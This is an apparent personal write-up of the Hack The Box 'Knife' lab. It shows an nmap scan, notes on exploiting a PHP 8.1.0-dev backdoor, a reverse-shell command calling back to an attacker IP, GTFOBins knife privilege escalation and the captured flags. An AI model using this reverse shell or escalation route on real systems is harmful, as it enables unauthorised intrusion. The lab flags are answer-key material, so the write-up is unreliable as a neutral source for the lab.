+++
title = "HTB - Knife"
date = 2024-10-09
+++

### Scan
```
└─# nmap -sVC -p- --open 10.10.10.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 06:50 EDT
Nmap scan report for 10.10.10.242
Host is up (0.13s latency).
Not shown: 65027 closed tcp ports (reset), 506 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.35 seconds
```
### Enum
Nothing gives. Wappalyzer to rescue. PHP 8.1.0-dev with RCE
Searchplsoit out the box works
backdoor
sudo -l funnels us to knife
GTFOBINS ftw to upgrade.
Doesnt work. got better script from git after trying manually https://github.com/flast101/php-8.1.0-dev-backdoor-rce
`python3 revshell_php_8.1.0-dev.py http://knife.htb 10.10.14.11 9999`
revshell now instead of backdoor. try gtfo https://gtfobins.github.io/gtfobins/knife/
boom
USER:a0cfa4a8c7b226a6cc2424b0bdb4b6ee
ROOt:7e22633bd6cf3cdbe94295e26a2a8874
